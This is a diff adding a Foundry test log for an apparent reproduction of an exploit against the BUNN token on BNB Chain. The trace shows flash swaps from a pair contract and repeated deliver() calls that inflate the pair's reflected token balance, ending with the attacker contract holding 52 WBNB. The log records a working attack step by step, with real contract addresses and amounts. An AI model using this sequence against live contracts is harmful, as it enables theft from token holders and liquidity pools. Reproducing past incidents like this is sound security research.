@@ -1,0 +1,104 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/BUNN_exp.sol:ContractTest
+[PASS] testExploit() (gas: 283830)
+Logs:
+  Before deliver,pair bunn balance: 7708350182684
+  After deliver,pair bunn balance: 52240860222579
+  Before deliver,pair bunn balance: 51240860222579
+  After deliver,pair bunn balance: 347268423609734
+  [End] Attacker WBNB balance after exploit: 52.000000000000000000
+
+Traces:
+  [5830] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 29304627 [2.93e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [289430] ContractTest::testExploit()
+    ├─ [199074] 0xb4B84375Ae9bb94d19F416D3db553827Be349520::swap(44000000000000000000 [4.4e19], 1000000000000 [1e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830)
+    │   ├─ [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 44000000000000000000 [4.4e19])
+    │   │   ├─ emit Transfer(from: 0xb4B84375Ae9bb94d19F416D3db553827Be349520, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 44000000000000000000 [4.4e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000002629f66e0c5300000
+    │   │   │   @ 0x64ab62875a975784aa1d232360254b18ff777729ed23618c6269006b0b986626: 0x000000000000000000000000000000000000000000000002e5cf50af6030a538 → 0x000000000000000000000000000000000000000000000000832fe9ce9b00a538
+    │   │   └─ ← [Return] true
+    │   ├─ [79826] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000 [1e12])
+    │   │   ├─ emit Transfer(from: 0xb4B84375Ae9bb94d19F416D3db553827Be349520, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000 [1e12])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x15dcf2fc89f84dd126f2c9a2395a21887016a68fa27d8d315c3d40f04c075000
+    │   │   │   @ 0x232946cabce0b52e6bf6a1619874f533f988b83c362cc391d44a117fd866f93a: 0xbe64317b902acddc8e42842034c740e19cfe10c19c82b441b838ea413d2d69f5 → 0xa8873e7f0632800b674fba7dfb6d1f592ce76a31fa0527105bfba950f12619f5
+    │   │   └─ ← [Return] true
+    │   ├─ [40503] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 44000000000000000000 [4.4e19], 1000000000000 [1e12], 0x307830)
+    │   │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   │   └─ ← [Return] 7708350182684 [7.708e12]
+    │   │   ├─ [0] console::log("Before deliver,pair bunn balance:", 7708350182684 [7.708e12]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [17334] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::deliver(990000000000 [9.9e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x0000000000000000000000000000000000000000000000000000013e9de30cf2 → 0x000000000000000000000000000000000000000000000000000002251e7c38f2
+    │   │   │   │   @ 7: 0xbe5d28bf89ecff6aa2142b4a29484a26078423b903132a62bbb362827ae0ee2e → 0xa8b82df39aef7f2d7e147308478b384f988c6f779d16de9ad39576b34e54922e
+    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x15dcf2fc89f84dd126f2c9a2395a21887016a68fa27d8d315c3d40f04c075000 → 0x0037f8309afacd9402f31160579d0fb2011ef24e3c814169741f55211f7af400
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   │   └─ ← [Return] 52240860222579 [5.224e13]
+    │   │   ├─ [0] console::log("After deliver,pair bunn balance:", 52240860222579 [5.224e13]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   └─ ← [Return] 9453031216447006008 [9.453e18]
+    │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   └─ ← [Return] 52240860222579 [5.224e13]
+    │   ├─ emit Sync(reserve0: 9453031216447006008 [9.453e18], reserve1: 52240860222579 [5.224e13])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 44537507669584 [4.453e13], amount0Out: 44000000000000000000 [4.4e19], amount1Out: 1000000000000 [1e12], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 10: 0x0000000000000000000000001334596b0cbf9f81158d0edaa05a1413806c4ab4 → 0x0000000000000000000000017d18e0d031914c52ce285f637efea794d5540eb4
+    │   │   @ 8: 0x60b6c754000000000000000007ea683cbe23000000000002e5cf50af6030a538 → 0x64935d0c00000000000000002f8345ea9473000000000000832fe9ce9b00a538
+    │   │   @ 9: 0x0000000000000000000000000000000000008dc533b2e4a0d2ed1d0c6f63b9bf → 0x00000000000000000000000000000000000b1a4b682f27add23e4b04733b55bf
+    │   └─ ← [Stop]
+    ├─ [81202] 0xb4B84375Ae9bb94d19F416D3db553827Be349520::swap(8000000000000000000 [8e18], 1000000000000 [1e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830)
+    │   ├─ [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8000000000000000000 [8e18])
+    │   │   ├─ emit Transfer(from: 0xb4B84375Ae9bb94d19F416D3db553827Be349520, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8000000000000000000 [8e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x64ab62875a975784aa1d232360254b18ff777729ed23618c6269006b0b986626: 0x000000000000000000000000000000000000000000000000832fe9ce9b00a538 → 0x000000000000000000000000000000000000000000000000142a34315fe0a538
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000002629f66e0c5300000 → 0x000000000000000000000000000000000000000000000002d1a51c7e00500000
+    │   │   └─ ← [Return] true
+    │   ├─ [23126] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000 [1e12])
+    │   │   ├─ emit Transfer(from: 0xb4B84375Ae9bb94d19F416D3db553827Be349520, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000 [1e12])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x232946cabce0b52e6bf6a1619874f533f988b83c362cc391d44a117fd866f93a: 0xa8873e7f0632800b674fba7dfb6d1f592ce76a31fa0527105bfba950f12619f5 → 0xa54d6442b3c7116a6b32e31554bfcf7535427bb9890bf898f9ee7e57197b09f5
+    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0037f8309afacd9402f31160579d0fb2011ef24e3c814169741f55211f7af400 → 0x0371d26ced663c34ff0fe8c8fe4a5f95f8c3e0c6ad7a6fe0d62c801af7260400
+    │   │   └─ ← [Return] true
+    │   ├─ [32403] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8000000000000000000 [8e18], 1000000000000 [1e12], 0x307830)
+    │   │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   │   └─ ← [Return] 51240860222579 [5.124e13]
+    │   │   ├─ [0] console::log("Before deliver,pair bunn balance:", 51240860222579 [5.124e13]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [11734] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::deliver(990000000000 [9.9e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 7: 0xa8b82df39aef7f2d7e147308478b384f988c6f779d16de9ad39576b34e54922e → 0xa58695e5f76b89f9a3355618feb18f9e8c573bb393a54cc35b79114633b2e62e
+    │   │   │   │   @ 8: 0x000000000000000000000000000000000000000000000000000002251e7c38f2 → 0x0000000000000000000000000000000000000000000000000000030b9f1564f2
+    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0371d26ced663c34ff0fe8c8fe4a5f95f8c3e0c6ad7a6fe0d62c801af7260400 → 0x00403a5f49e247012430cbd9b570b6e4ec8ead02a408de095e101aaddc845800
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   │   └─ ← [Return] 347268423609734 [3.472e14]
+    │   │   ├─ [0] console::log("After deliver,pair bunn balance:", 347268423609734 [3.472e14]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   └─ ← [Return] 1453031216447006008 [1.453e18]
+    │   ├─ [7833] 0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039::balanceOf(0xb4B84375Ae9bb94d19F416D3db553827Be349520) [staticcall]
+    │   │   └─ ← [Return] 347268423609734 [3.472e14]
+    │   ├─ emit Sync(reserve0: 1453031216447006008 [1.453e18], reserve1: 347268423609734 [3.472e14])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 296027563387155 [2.96e14], amount0Out: 8000000000000000000 [8e18], amount1Out: 1000000000000 [1e12], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x64935d0c00000000000000002f8345ea9473000000000000832fe9ce9b00a538 → 0x64935d0c00000000000000013bd6bb07ed86000000000000142a34315fe0a538
+    │   └─ ← [Stop]
+    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 52000000000000000000 [5.2e19]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 52000000000000000000 [5.2e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.25s (6.94s CPU time)
+
+Ran 1 test suite in 10.20s (8.25s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
